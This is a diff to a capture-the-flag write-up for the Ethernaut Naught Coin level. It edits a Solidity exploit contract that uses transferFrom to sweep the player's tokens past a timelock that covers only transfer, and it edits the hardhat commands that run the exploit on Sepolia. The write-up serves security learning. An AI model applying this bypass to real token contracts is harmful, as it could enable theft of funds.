@@ -99,7 +99,7 @@ Since only the `transfer` function is overridden with the timelock, we can use t
 
 ### Exploit Contract
 
-The solution involves creating a contract that uses `transferFrom` to move tokens:
+The solution involves creating a contract that uses `transferFrom` to move tokens from the player to the contract itself:
 
 ```solidity
 // SPDX-License-Identifier: MIT
@@ -125,14 +125,14 @@ contract NaughtCoinExploit {
         owner = msg.sender;
     }
     
-    function bypassTimeLock(address _to) external {
+    function bypassTimeLock() external {
         require(msg.sender == owner, "Only owner can bypass the timelock");
         
         address player = naughtCoin.player();
         uint256 playerBalance = naughtCoin.balanceOf(player);
         
-        // Transfer all tokens from the player to the specified address
-        naughtCoin.transferFrom(player, _to, playerBalance);
+        // Transfer all tokens from the player to the contract address
+        naughtCoin.transferFrom(player, address(this), playerBalance);
     }
     
     function checkSuccess() external view returns (bool) {
@@ -158,17 +158,13 @@ contract NaughtCoinExploit {
 
 3. **Execute the Exploit**
 
-   First, the player must approve the exploit contract to spend tokens:
+   First, the player must approve the exploit contract to spend tokens, then the script will execute the exploit to transfer tokens to the contract itself:
 
    ```shell
    EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xNaughtCoinAddress npx hardhat run scripts/level-15-naught-coin/execute-naught-coin-exploit.ts --network sepolia
    ```
 
-4. **Verify Success**
-
-   ```shell
-   EXPLOIT_ADDRESS=0xYourExploitAddress TARGET_ADDRESS=0xNaughtCoinAddress npx hardhat run scripts/level-15-naught-coin/verify-exploit-success.ts --network sepolia
-   ```
+   The script will verify if the exploit was successful by checking if the player's balance is zero.
 
 ## Key Insights
 
